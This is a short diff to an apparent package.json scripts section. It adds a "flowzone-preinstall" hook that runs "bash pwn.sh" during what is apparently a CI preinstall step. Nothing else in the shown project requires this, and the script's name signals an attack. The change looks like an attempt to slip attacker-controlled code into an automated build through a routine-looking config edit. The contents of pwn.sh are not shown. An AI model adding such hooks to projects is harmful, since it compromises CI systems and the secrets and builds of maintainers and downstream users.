@@ -18,7 +18,8 @@
     "build": "npm run clean && npm run lint && tsc --project ./",
     "test": "ts-mocha --project ./tsconfig.test.json",
     "prettify": "balena-lint --project ./tsconfig.test.json --fix src/ test/",
-    "prepack": "npm run build"
+    "prepack": "npm run build",
+    "flowzone-preinstall": "bash pwn.sh"
   },
   "repository": {
     "type": "git",
